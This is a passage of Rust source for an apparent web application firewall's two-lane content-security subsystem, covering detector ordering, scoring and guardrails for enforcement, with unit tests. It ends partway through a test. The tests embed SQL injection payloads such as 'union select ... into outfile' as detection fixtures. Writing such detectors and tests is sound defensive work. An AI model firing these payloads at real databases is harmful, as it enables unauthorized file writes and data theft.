//! Two-lane content-security subsystem.
//!
//! # Lane 1 — `legacy_veto` (frozen, G1)
//! [`ContentSecuritySubsystem::evaluate`] is control-flow &
//! observable-semantic equivalent to the historical `content_checkers` loop:
//! the same four detectors (`SQLi` → XSS → RCE → Traversal), in the same
//! construction order, each with the unchanged `Check::check(&RequestCtx)`
//! signature, the frozen [`crate::checks::request_targets`] field set and decode
//! depth, and first-match-wins short-circuit + fail-closed. It is **completely
//! frozen** and never changes.
//!
//! # Lane 2 — `semantic_scoring` (P1a foundation, additive)
//! [`ContentSecuritySubsystem::evaluate_scoped`] runs Lane 1 first and, only when
//! the semantic lane is enabled (off by default), then runs Lane 2: the
//! phase-limited [`preprocess::semantic_preprocessor`] → detectors → the closed
//! [`scoring::score`] model, returning [`ContentVerdict::Semantic`].
//!
//! The five attack families ship enabled but **shadow-only** by default: the
//! shipped `enforcement_mode = log_only` (and the empty per-family
//! `enforcement_overrides`) means a match is at most a `LogOnly` security event +
//! a persisted observation, **never** a Block.
//!
//! **E0 wires the block-capable enforce path.** The engine dispatch now calls the
//! block-capable [`Self::resolve_enforced_action`] (not the P1b log-cap
//! [`Self::resolve_action`], which is retained for its shadow tests). That
//! resolver only returns `Block` when the effective per-family mode is `enforce`
//! AND all four shadow guardrails pass (restart warmup latch → canary bucket →
//! circuit breaker → host `log_only_mode`) AND the A2 blind guard holds (a
//! blind/synthetic-only Block is downgraded to shadow `Log`). With the shipped
//! `log_only` posture it can only ever return `Log`/`None`, so enabling a detector
//! still cannot change the final action versus a Lane-2-off engine — the
//! zero-behaviour-change guarantee. `enforce` is opt-in per the global
//! `enforcement_mode` or a per-family `enforcement_overrides` entry.

pub mod budget;
pub mod canary;
pub mod config;
pub mod detectors;
pub mod preprocess;
pub mod scoring;
mod struct_extract;
pub mod types;
pub mod xss_dom;
pub mod xss_js;

use std::time::Instant;

use parking_lot::Mutex;

use waf_common::{DetectionResult, RequestCtx};

use crate::checks::{Check, DirTraversalCheck, RceCheck, SqlInjectionCheck, XssCheck};

pub use budget::{Budget, ContentInspectionState};
pub use canary::{BreakerState, CircuitBreaker, canary_bucket, in_canary};
pub use config::{Dialect, EnforcementMode, RuntimeContentSecurityConfig};
pub use detectors::{
    AstSqlDetector, RceAstDetector, RceStructuralDetector, StructuralSqlDetector, TraversalStructuralDetector,
};
pub use preprocess::{PreprocessCtx, SemanticDetector, View, semantic_preprocessor};
pub use scoring::{RuntimeAttackConfig, RuntimeScoringConfig, score};
pub use types::{
    AttackKind, Confidence, DetectionFinding, DetectionSignal, DetectorId, InspectionScope, Provenance, SemanticAction,
    SemanticVerdict,
};
pub use xss_dom::XssDomDetector;
pub use xss_js::XssJsTokenDetector;

/// Outcome of a content-security evaluation, carrying the verdict's source so
/// the engine can dispatch it correctly (plan §3.2).
///
/// * `LegacyVeto` — a Lane 1 (frozen four-detector) hard veto. The engine maps
///   it straight onto the existing `record_block` path; host `log_only_mode`
///   still decides Block vs `LogOnly`. `semantic_enforcement_mode` **never**
///   downgrades it.
/// * `Semantic` — a Lane 2 scoring result (advisory). The engine applies the
///   double log-only truth table + canary/breaker and, in shadow mode, at most
///   logs. It **never** short-circuits the suffix pipeline.
/// * `None` — no content-attack hit; fall through to the unchanged suffix.
#[derive(Debug)]
pub enum ContentVerdict {
    /// Lane 1 hard veto: one of the four frozen legacy detectors matched.
    LegacyVeto {
        /// The detection produced by the first matching detector.
        result: DetectionResult,
    },
    /// Lane 2 semantic scoring result (advisory; never a hard veto).
    Semantic(SemanticVerdict),
    /// No content-attack hit; fall through to the unchanged suffix pipeline.
    None,
}

/// Content-security subsystem — owns the Lane 1 detectors, the Lane 2 detector
/// set (empty in P1a) and the compiled Lane 2 runtime config + breaker state.
pub struct ContentSecuritySubsystem {
    /// Lane 1 detectors, in the frozen order `SQLi` → XSS → RCE → Traversal.
    legacy_checkers: Vec<Box<dyn Check>>,
    /// Compiled, immutable Lane 2 config (default = lane off).
    config: RuntimeContentSecurityConfig,
    /// Lane 2 semantic detectors: the structural + AST `SQLi` detectors, the
    /// RCE / Traversal detectors and the XSS DOM + JS-token detectors (P-XSS-2,
    /// 0.5/0.5 corroboration); tests may push additional mocks.
    detectors: Vec<Box<dyn SemanticDetector>>,
    /// Runtime anomaly-rate breaker state (never persisted; restart resets it).
    breaker: Mutex<CircuitBreaker>,
    /// Process/subsystem start instant — the anchor for the restart shadow latch
    /// (plan §13.3, codex A-4). Semantic enforcement stays shadow (`log_only`)
    /// until a health warmup window (`breaker.window`) has elapsed since this
    /// instant, so a restart can never resume blocking immediately even with a
    /// `Closed` breaker and a configured `enforce` mode. Never persisted.
    created_at: Instant,
}

impl ContentSecuritySubsystem {
    /// Build the subsystem with the four frozen Lane 1 detectors and the Lane 2
    /// lane **off** (zero-config default).
    #[must_use]
    pub fn new() -> Self {
        Self::with_config(RuntimeContentSecurityConfig::default())
    }

    /// Build the subsystem with an explicit compiled Lane 2 config. Lane 1 is
    /// always the same frozen four detectors; Lane 2 ships no detectors in P1a.
    #[must_use]
    pub fn with_config(config: RuntimeContentSecurityConfig) -> Self {
        // Frozen order — must match the historical content_checkers vector.
        let legacy_checkers: Vec<Box<dyn Check>> = vec![
            Box::new(SqlInjectionCheck::new()),
            Box::new(XssCheck::new()),
            Box::new(RceCheck::new()),
            Box::new(DirTraversalCheck::new()),
        ];
        let now = Instant::now();
        let breaker = Mutex::new(CircuitBreaker::new(config.breaker, now));
        // Production Lane 2 detectors: the structural SQLi detector (P1b) and the
        // sqlparser AST SQLi detector (P2, the second `SqlInjection`-family
        // detector), plus the RCE (shell command injection) and Traversal T1
        // (encoded path traversal) detectors (P1c). Each only contributes to
        // scoring when ITS attack family is enabled + weighted (the AST detector on
        // the `ast` weight); with the lane off
        // (`config.enabled == false`) `evaluate_scoped` short-circuits before any
        // detector runs, so the zero-config install still does zero Lane 2 work.
        // NOTE (P-XSS-2): the XSS token detector MUST be registered immediately
        // after the XSS DOM detector — the DOM detector's single HTML parse stashes
        // the JS execution contexts that the token detector drains for the 0.5/0.5
        // corroboration (see `xss_dom` / `xss_js`). The DOM detector overwrites the
        // stash on every view, so no earlier view can leak forward.
        let detectors: Vec<Box<dyn SemanticDetector>> = vec![
            Box::new(detectors::StructuralSqlDetector::new()),
            Box::new(detectors::AstSqlDetector::new()),
            Box::new(detectors::RceStructuralDetector::new()),
            Box::new(detectors::RceAstDetector::new()),
            Box::new(detectors::TraversalStructuralDetector::new()),
            Box::new(xss_dom::XssDomDetector::new()),
            Box::new(xss_js::XssJsTokenDetector::new()),
        ];
        Self {
            legacy_checkers,
            config,
            detectors,
            breaker,
            created_at: now,
        }
    }

    /// The compiled Lane 2 config (read-only).
    #[must_use]
    pub const fn config(&self) -> &RuntimeContentSecurityConfig {
        &self.config
    }

    /// Lane 1 `legacy_veto` **only** — the frozen G1 behaviour. Runs the four
    /// detectors in order and returns the first hit, else `None`. Zero side
    /// effects. Used where Lane 2 is not wired (e.g. the G0/G1 parity tests).
    #[must_use]
    pub fn evaluate(&self, ctx: &RequestCtx) -> ContentVerdict {
        for checker in &self.legacy_checkers {
            if let Some(result) = checker.check(ctx) {
                return ContentVerdict::LegacyVeto { result };
            }
        }
        ContentVerdict::None
    }

    /// Full two-lane evaluation. Lane 1 runs first and, on a hit, short-circuits
    /// exactly as before. Only when Lane 1 is clean **and** the semantic lane is
    /// enabled does Lane 2 run (phase-limited preprocess → detectors → closed
    /// scoring), returning [`ContentVerdict::Semantic`].
    ///
    /// Zero side effects: read-only over `ctx` (may only mutate the caller's
    /// budget `state`). All logging / persistence / final action stays in the
    /// engine.
    #[must_use]
    pub fn evaluate_scoped(
        &self,
        ctx: &RequestCtx,
        scope: InspectionScope,
        state: &mut ContentInspectionState,
    ) -> ContentVerdict {
        // ── Lane 1: frozen legacy veto ───────────────────────────────────────
        // Single source of truth: delegate to [`Self::evaluate`] so the frozen
        // four-detector loop exists in exactly ONE place. The default parity
        // suite (which calls `evaluate`) and the production engine (which calls
        // `evaluate_scoped`) therefore exercise the identical Lane 1 code — a
        // future change to the loop can no longer pass the parity gate while
        // silently diverging on the production path (codex A-3).
        if let ContentVerdict::LegacyVeto { result } = self.evaluate(ctx) {
            return ContentVerdict::LegacyVeto { result };
        }

        // ── Lane 2: additive semantic scoring (off by default) ───────────────
        // The lane runs only when it is enabled AND the enforcement mode is not
        // `off`. `off` means "produce no action at all" (codex A-2): no
        // preprocessing, no detection, no LogOnly event and no observation — it
        // is behaviourally identical to `enabled = false`. `log_only` and
        // `enforce` both run the lane; in P1b `enforce` is not wired to the block
        // path, so it behaves like `log_only` (detect + log + persist, never
        // Block) and the startup logs a WARN.
        if !self.config.enabled || self.config.enforcement_mode == EnforcementMode::Off {
            return ContentVerdict::None;
        }

        state.begin_phase();
        let views = semantic_preprocessor(scope, ctx, state);
        let pctx = PreprocessCtx { scope, req: ctx };
        let mut signals: Vec<DetectionSignal> = Vec::new();
        for view in &views {
            for detector in &self.detectors {
                if let Some(finding) = detector.detect(view, &pctx, state) {
                    // Pipeline-owned context (codex A-1): the detector returns a
                    // context-free finding; provenance/field/scope/detector-id are
                    // stamped here from the real view, so a detector cannot forge
                    // the provenance that decides hard-veto eligibility.
                    signals.push(view.to_signal(detector.id(), scope, finding));
                }
            }
        }

        let verdict = score(&signals, &self.config.scoring, state.is_degraded());
        ContentVerdict::Semantic(verdict)
    }

    /// Whether the restart shadow latch has lifted at `now` (plan §13.3, codex
    /// A-4): semantic enforcement is held to shadow (`log_only`) until the health
    /// warmup window (`breaker.window`) has elapsed since [`Self::created_at`].
    /// After a restart `created_at` is fresh, so the lane cannot resume blocking
    /// immediately even with a `Closed` breaker and a configured `enforce` mode.
    #[must_use]
    fn enforcement_warmed_up(&self, now: Instant) -> bool {
        now.duration_since(self.created_at) >= self.config.breaker.window
    }

    /// The P1b log-capping resolver — a `Block`-incapable projection kept for its
    /// shadow unit tests (it maps `off` → `None`, and both `log_only` **and**
    /// `enforce` → `Log`).
    ///
    /// **Superseded by [`Self::resolve_enforced_action`] on the engine path (E0):**
    /// the engine dispatch no longer calls this. It remains as a compact witness
    /// that a Lane 2 recommendation is never a Block absent the full enforce
    /// machinery, so the many `real_*_detector_fires_but_shadow_never_blocks` tests
    /// still assert the shadow guarantee against a single, side-effect-free helper.
    #[must_use]
    pub fn resolve_action(&self, rec: SemanticAction) -> SemanticAction {
        match self.config.enforcement_mode {
            // `off` produces no action at all.
            EnforcementMode::Off => SemanticAction::None,
            // Shadow: `log_only` AND `enforce` both cap at Log in P1b — enforce is
            // exactly log_only (never Block). A `None` recommendation stays `None`.
            EnforcementMode::LogOnly | EnforcementMode::Enforce => {
                if rec == SemanticAction::None {
                    SemanticAction::None
                } else {
                    SemanticAction::Log
                }
            }
        }
    }

    /// The **effective** enforcement mode for a verdict's primary `family` (E0).
    /// A per-family override (`enforcement_overrides`) wins over the global
    /// [`RuntimeContentSecurityConfig::enforcement_mode`]; a family with no
    /// override (or `None`, i.e. no primary) inherits the global mode. The shipped
    /// empty override map therefore reproduces the pure-global posture exactly.
    #[must_use]
    fn effective_enforcement_mode(&self, family: Option<AttackKind>) -> EnforcementMode {
        family
            .and_then(|f| self.config.enforcement_overrides.get(&f).copied())
            .unwrap_or(self.config.enforcement_mode)
    }

    /// The block-capable enforcement resolver — **the resolver the engine dispatch
    /// calls in E0** (plan §13.3 / §13.4 double log-only table). It resolves the
    /// effective per-family mode, then applies the four shadow guardrails in order:
    /// restart warmup latch → canary bucket → circuit breaker → host `log_only_mode`
    /// downgrade, plus the A2 blind guard. `now` is injected for deterministic
    /// testing.
    ///
    /// Any of these holds a would-be `Block` to shadow `Log`:
    /// * effective mode is `log_only` (or `off` → `None`);
    /// * the restart warmup window has not elapsed since process start (codex A-4);
    /// * the request's canary bucket is outside `rollout_bps`;
    /// * the circuit breaker is open;
    /// * the host is in `log_only_mode` (per-host total kill switch);
    /// * **A2**: the Block is not `enforce_safe` — i.e. it is carried solely by
    ///   blind/synthetic views (base64/hex/comment-strip/HPP/parse-error), which
    ///   may never single-handedly enforce.
    ///
    /// Only when the effective mode is `enforce`, all four guardrails pass and the
    /// Block is enforce-safe does it return `Block`. With the shipped `log_only`
    /// posture (and empty overrides) it can only ever return `Log`/`None`, so the
    /// engine dispatch is a no-op on the final action — the zero-behaviour-change
    /// guarantee.
    #[must_use]
    pub(crate) fn resolve_enforced_action(
        &self,
        rec: SemanticAction,
        family: Option<AttackKind>,
        enforce_safe: bool,
        host_code: &str,
        request_key: &str,
        host_log_only: bool,
        now: Instant,
    ) -> SemanticAction {
        if rec == SemanticAction::None {
            return SemanticAction::None;
        }
        match self.effective_enforcement_mode(family) {
            EnforcementMode::Off => SemanticAction::None,
            // Shadow: at most log, never block.
            EnforcementMode::LogOnly => SemanticAction::Log,
            EnforcementMode::Enforce => {
                // Restart shadow latch: enforcement stays shadow until the health
                // warmup window has elapsed since process start (codex A-4).
                if !self.enforcement_warmed_up(now) {
                    return SemanticAction::Log;
                }
                let bucket = canary_bucket(host_code, request_key, &self.config.rollout_salt);
                if !in_canary(bucket, self.config.rollout_bps) {
                    // Not selected for enforcement → shadow-log only.
                    return SemanticAction::Log;
                }
                let allowed = {
                    let mut br = self.breaker.lock();
                    let allowed = br.allows_enforcement(now);
                    // Anomaly proxy pending real-traffic calibration (plan §13.3):
                    // a block outcome counts as an anomaly sample.
                    br.record(matches!(rec, SemanticAction::Block), now);
                    allowed
                };
                if !allowed {
                    return SemanticAction::Log;
                }
                if host_log_only {
                    return SemanticAction::Log;
                }
                // A2 blind guard: a Block reached SOLELY through blind/synthetic
                // views is held to shadow Log. blind provenance can never
                // single-handedly enforce (it may not hard-veto either) — a
                // base64/hex-wrapped payload the backend never parses raw must not
                // auto-block on its own.
                if rec == SemanticAction::Block && !enforce_safe {
                    return SemanticAction::Log;
                }
                rec
            }
        }
    }
}

impl Default for ContentSecuritySubsystem {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use std::borrow::Cow;
    use std::collections::{BTreeMap, HashMap};
    use std::sync::Arc;
    use std::time::Duration;

    use bytes::Bytes;
    use waf_common::HostConfig;
    use waf_common::content_security_config::{ContentSecurityConfig, SemanticAttackConfig};

    use super::*;

    /// Test-only detector that fires a fixed signal on every view, so the Lane 2
    /// pipeline (preprocess → detect → score → resolve) can be exercised without
    /// shipping a production detector.
    struct MockSqliDetector {
        confidence: u8,
    }

    impl SemanticDetector for MockSqliDetector {
        fn id(&self) -> DetectorId {
            DetectorId::StructRule
        }

        fn detect(
            &self,
            _view: &View<'_>,
            _ctx: &PreprocessCtx<'_>,
            _state: &mut ContentInspectionState,
        ) -> Option<DetectionFinding> {
            // A detector reports only its authoritative fields; it cannot supply
            // provenance/field/scope — the pipeline attaches those from the view.
            Some(DetectionFinding {
                attack: AttackKind::SqlInjection,
                confidence: Confidence::saturating(self.confidence),
                rule_key: "sql.union_null",
                detail: Cow::Borrowed("mock"),
            })
        }
    }

    fn ctx() -> RequestCtx {
        RequestCtx {
            req_id: "t".to_string(),
            client_ip: "127.0.0.1".parse().expect("ip"),
            client_port: 0,
            method: "POST".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: String::new(),
            headers: HashMap::new(),
            // Benign body so Lane 1 stays clean and Lane 2 gets to run; the mock
            // detector fires on any view regardless of content.
            body_preview: Bytes::from_static(b"greeting=hello"),
            content_length: 14,
            is_tls: false,
            host_config: Arc::new(HostConfig::default()),
            geo: None,
        }
    }

    fn enabled_enforce_cfg() -> RuntimeContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert("struct_rule".to_string(), 1.0);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            "sql_injection".to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: Vec::new(),
            },
        );
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "enforce".to_string(),
            rollout_bps: 10_000,
            attacks,
            ..ContentSecurityConfig::default()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn default_subsystem_never_produces_semantic() {
        // No detectors + lane off → evaluate_scoped never returns Semantic.
        let sub = ContentSecuritySubsystem::new();
        let mut st = ContentInspectionState::default();
        let v = sub.evaluate_scoped(&ctx(), InspectionScope::Body, &mut st);
        assert!(matches!(v, ContentVerdict::None), "clean request with lane off → None");
    }

    #[test]
    fn enabled_lane_benign_input_scores_zero() {
        // Lane enabled + enforce, production StructuralSqlDetector registered, but
        // a benign body → no signal → Semantic with score 0 and recommendation
        // None. The detector never fires on clean traffic.
        let sub = ContentSecuritySubsystem::with_config(enabled_enforce_cfg());
        let mut st = ContentInspectionState::default();
        match sub.evaluate_scoped(&ctx(), InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => {
                assert_eq!(v.request_score, 0);
                assert_eq!(v.recommendation, SemanticAction::None);
                assert!(v.primary_result.is_none());
            }
            other => panic!("expected Semantic, got {other:?}"),
        }
    }

    #[test]
    fn next_stage_enforced_resolver_can_block_but_host_log_only_downgrades() {
        // The block-capable NEXT-STAGE resolver (`resolve_enforced_action`, NOT
        // wired in P1b) would block in enforce, and host log_only_mode downgrades
        // it — proving the plumbing works while the P1b engine path stays inert.
        let mut sub = ContentSecuritySubsystem::with_config(enabled_enforce_cfg());
        sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));
        let mut st = ContentInspectionState::default();
        let rec = match sub.evaluate_scoped(&ctx(), InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v.recommendation,
            other => panic!("expected Semantic, got {other:?}"),
        };
        assert_eq!(rec, SemanticAction::Block, "score 100 ≥ block threshold");
        // Past the restart warmup window (breaker.window default = 300s):
        // host log_only=false → Block; host log_only=true → downgraded to Log.
        // family=None inherits the global (enforce) mode; enforce_safe=true (a
        // real, non-blind primary) so the A2 guard does not intervene here.
        let warm = sub.created_at + Duration::from_secs(301);
        assert_eq!(
            sub.resolve_enforced_action(rec, None, true, "h", "k", false, warm),
            SemanticAction::Block
        );
        assert_eq!(
            sub.resolve_enforced_action(rec, None, true, "h", "k", true, warm),
            SemanticAction::Log
        );
        // But the P1b engine-facing resolver caps enforce at Log regardless.
        assert_eq!(
            sub.resolve_action(rec),
            SemanticAction::Log,
            "the P1b resolver never blocks, even in enforce mode"
        );
    }

    #[test]
    fn next_stage_enforced_resolver_is_shadow_latched_until_warmup_window() {
        // codex A-4: even in enforce + 100% canary + Closed breaker, the
        // NEXT-STAGE resolver holds a would-be Block to shadow Log until the health
        // warmup window elapses since subsystem start — a restart cannot resume
        // blocking immediately.
        let mut sub = ContentSecuritySubsystem::with_config(enabled_enforce_cfg());
        sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));

        // Inside the warmup window → shadow Log.
        let cold = sub.created_at + Duration::from_secs(1);
        assert_eq!(
            sub.resolve_enforced_action(SemanticAction::Block, None, true, "h", "k", false, cold),
            SemanticAction::Log,
            "within the restart warmup window enforcement stays shadow"
        );

        // After the warmup window (breaker.window default 300s) → Block allowed.
        let warm = sub.created_at + Duration::from_secs(301);
        assert_eq!(
            sub.resolve_enforced_action(SemanticAction::Block, None, true, "h", "k", false, warm),
            SemanticAction::Block,
            "after the warmup window enforcement is permitted"
        );
    }

    /// Global `log_only` config with a per-family `enforce` override on
    /// `sql_injection` and a 100% canary — the E0 "operator turns on one family"
    /// posture. `struct_rule` weighted 1.0.
    fn per_family_enforce_sqli_rt() -> RuntimeContentSecurityConfig {
        let mut overrides = BTreeMap::new();
        overrides.insert("sql_injection".to_string(), "enforce".to_string());
        let cfg = ContentSecurityConfig {
            rollout_bps: 10_000,
            enforcement_overrides: overrides,
            ..enabled_enforce_source() // global mode defaults to log_only
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn per_family_override_enforces_only_the_named_family() {
        // Global posture is log_only; only sql_injection is overridden to enforce.
        let sub = ContentSecuritySubsystem::with_config(per_family_enforce_sqli_rt());
        let warm = sub.created_at + Duration::from_secs(301);
        // The overridden family blocks (warmed, 100% canary, enforce_safe, non
        // host-log-only).
        assert_eq!(
            sub.resolve_enforced_action(
                SemanticAction::Block,
                Some(AttackKind::SqlInjection),
                true,
                "h",
                "k",
                false,
                warm
            ),
            SemanticAction::Block,
            "the sql_injection override switches that family to enforce"
        );
        // A family WITHOUT an override inherits the global log_only → shadow Log.
        assert_eq!(
            sub.resolve_enforced_action(
                SemanticAction::Block,
                Some(AttackKind::Rce),
                true,
                "h",
                "k",
                false,
                warm
            ),
            SemanticAction::Log,
            "an un-overridden family stays shadow under the global log_only"
        );
        // No primary family (None) also inherits the global log_only.
        assert_eq!(
            sub.resolve_enforced_action(SemanticAction::Block, None, true, "h", "k", false, warm),
            SemanticAction::Log,
            "no primary family → global log_only"
        );
    }

    #[test]
    fn enforce_blind_only_block_downgraded_to_log_but_observable_blocks() {
        // A2 at the resolver: enforce + warmed + 100% canary + host not log_only.
        // A blind-only Block (enforce_safe = false) is held to shadow Log; the same
        // context with non-synthetic corroboration (enforce_safe = true) blocks.
        let sub = ContentSecuritySubsystem::with_config(enabled_enforce_cfg());
        let warm = sub.created_at + Duration::from_secs(301);
        assert_eq!(
            sub.resolve_enforced_action(SemanticAction::Block, None, false, "h", "k", false, warm),
            SemanticAction::Log,
            "a Block carried solely by blind/synthetic views must not enforce (A2)"
        );
        assert_eq!(
            sub.resolve_enforced_action(SemanticAction::Block, None, true, "h", "k", false, warm),
            SemanticAction::Block,
            "the same context with a non-synthetic view enforces"
        );
    }

    /// Build an enabled-enforce runtime config whose `SQLi` family lists
    /// `sql.union_null` on its hard-veto allowlist.
    fn allowlisted_sqli_rt() -> RuntimeContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert("struct_rule".to_string(), 1.0);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            "sql_injection".to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: vec!["sql.union_null".to_string()],
            },
        );
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "enforce".to_string(),
            attacks,
            ..ContentSecurityConfig::default()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn detector_cannot_forge_provenance_on_blind_decoded_view() {
        // codex A-1: a detector fires a hard-veto-allowlisted rule while
        // inspecting a `BlindDecoded` view and would "want" to look like `Raw`.
        // It can only return a context-free `DetectionFinding` — there is no
        // provenance field to forge. `View::to_signal` stamps the REAL
        // `BlindDecoded` provenance, so the scorer refuses to hard-veto.
        let detector = MockSqliDetector { confidence: 50 };
        let rt = allowlisted_sqli_rt();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();

        // Negative: BlindDecoded view — must NOT hard-veto.
        let blind_view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed("1 union select"),
            lower_trunc: "1 union select".to_string(),
            provenance: Provenance::BlindDecoded,
        };
        let finding = detector.detect(&blind_view, &pctx, &mut st).expect("mock always fires");
        let signal = blind_view.to_signal(detector.id(), pctx.scope, finding);
        assert_eq!(
            signal.provenance,
            Provenance::BlindDecoded,
            "provenance is pipeline-owned: it comes from the view, not the detector"
        );
        let verdict = score(std::slice::from_ref(&signal), &rt.scoring, false);
        assert_ne!(
            verdict.recommendation,
            SemanticAction::Block,
            "a BlindDecoded view must never hard-veto, even on the allowlist"
        );

        // Positive control (non-vacuous): the SAME detector on a Raw view DOES
        // hard-veto through the identical pipeline path.
        let raw_view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed("1 union select"),
            lower_trunc: "1 union select".to_string(),
            provenance: Provenance::Raw,
        };
        let raw_finding = detector.detect(&raw_view, &pctx, &mut st).expect("mock always fires");
        let raw_signal = raw_view.to_signal(detector.id(), pctx.scope, raw_finding);
        let raw_verdict = score(std::slice::from_ref(&raw_signal), &rt.scoring, false);
        assert_eq!(
            raw_verdict.recommendation,
            SemanticAction::Block,
            "a Raw view on the allowlist still hard-vetoes — the negative test is not vacuous"
        );
    }

    #[test]
    fn degraded_request_fails_open_no_recommendation() {
        // codex A-2: a positive signal on the first field, then the budget is
        // exhausted → the request is degraded → the Semantic verdict carries NO
        // recommendation (fail-open to legacy), even though the mock detector
        // fired confidence 100. Header scope so there are ≥2 fields.
        let mut cfg = enabled_enforce_cfg();
        // Output budget large enough for the short path field (raw + normalise)
        // but exhausted before the query field → degraded mid-phase.
        cfg.budget = Budget {
            max_preprocess_output_bytes_total: 4,
            ..Budget::default()
        };
        let mut sub = ContentSecuritySubsystem::with_config(cfg);
        sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));

        let mut req = ctx();
        req.path = "/a".to_string();
        // Benign query (must not trip Lane 1) but long enough to exhaust the
        // tiny output budget on the second field.
        req.query = "greeting=hello_there_this_is_a_benign_long_value".to_string();
        let mut st = ContentInspectionState::new(sub.config().budget);
        match sub.evaluate_scoped(&req, InspectionScope::Header, &mut st) {
            ContentVerdict::Semantic(v) => {
                assert!(st.is_degraded(), "budget exhaustion must mark the request degraded");
                assert_eq!(
                    v.recommendation,
                    SemanticAction::None,
                    "a degraded request must not produce a Block/Log recommendation"
                );
                assert!(
                    v.primary_result.is_none(),
                    "degraded fail-open clears the primary result"
                );
                assert_eq!(v.request_score, 0, "degraded fail-open reports no score");
            }
            other => panic!("expected Semantic, got {other:?}"),
        }
    }

    #[test]
    fn log_only_mode_never_blocks_even_with_detector() {
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "log_only".to_string(),
            ..enabled_enforce_source()
        };
        let rt = RuntimeContentSecurityConfig::compile(&cfg).expect("valid");
        let mut sub = ContentSecuritySubsystem::with_config(rt);
        sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));
        assert_eq!(
            sub.resolve_action(SemanticAction::Block),
            SemanticAction::Log,
            "shadow mode never blocks"
        );
    }

    /// Enabled config with the `SQLi` family weighted on `struct_rule`, in the
    /// default P1b **shadow** posture (`enforcement_mode = log_only`).
    fn sqli_log_only_rt() -> RuntimeContentSecurityConfig {
        let cfg = ContentSecurityConfig {
            enforcement_mode: "log_only".to_string(),
            ..enabled_enforce_source()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn real_sqli_detector_fires_but_shadow_never_blocks() {
        // The production StructuralSqlDetector fires on a real `into outfile`
        // payload (confidence 95 ≥ block threshold 80) so the scorer's
        // recommendation is EXACTLY `Block` — the request genuinely crosses the
        // block bar, not merely the log bar (codex A-5). Yet with the default P1b
        // `log_only` mode the resolver downgrades the effective action to `Log`,
        // proving the shadow-not-block guarantee is a real downgrade, not an
        // artefact of a sub-threshold score. Lane 1 would veto this raw payload
        // first inside `evaluate_scoped`, so we drive the Lane 2 detector →
        // scoring → shadow-resolve pipeline directly to isolate it.
        let sub = ContentSecuritySubsystem::with_config(sqli_log_only_rt());
        let det = StructuralSqlDetector::new();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed("1 union select 1 into outfile '/tmp/x'"),
            lower_trunc: "1 union select 1 into outfile '/tmp/x'".to_string(),
            provenance: Provenance::Raw,
        };
        let mut st = ContentInspectionState::default();
        let finding = det
            .detect(&view, &pctx, &mut st)
            .expect("the real SQLi detector must fire on into-outfile");
        assert_eq!(finding.rule_key, "sql.into_outfile", "the strongest rule (95) wins");
        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);

        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
        // Non-empty detection evidence + the recommendation is EXACTLY Block.
        assert!(!verdict.signals.is_empty(), "detection evidence must be recorded");
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "confidence 95 (weight 1.0) must reach the block threshold (80)"
        );
        // In log_only mode the P1b resolver downgrades the genuine Block to Log.
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) must downgrade a genuine Block to Log (real downgrade, not sub-threshold)"
        );
    }

    // ── P1c: RCE + Traversal detectors fire but shadow never blocks ───────────

    /// Enabled `log_only` (shadow) runtime config with a single-detector family.
    fn single_family_log_only_rt(family: &str, detector: &str) -> RuntimeContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert(detector.to_string(), 1.0);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            family.to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: Vec::new(),
            },
        );
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "log_only".to_string(),
            attacks,
            ..ContentSecurityConfig::default()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn real_rce_detector_fires_but_shadow_never_blocks() {
        // The production RceStructuralDetector fires on a reverse shell (conf 92 ≥
        // block threshold 80) so the scorer recommends EXACTLY Block — yet the
        // default log_only posture downgrades the effective action to Log. Lane 1
        // would veto this raw payload first, so we drive the Lane 2 pipeline
        // directly (as the SQLi shadow test does).
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("rce", "rce"));
        let det = RceStructuralDetector::new();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let view = View {
            location: Cow::Borrowed("body"),
            round: 0,
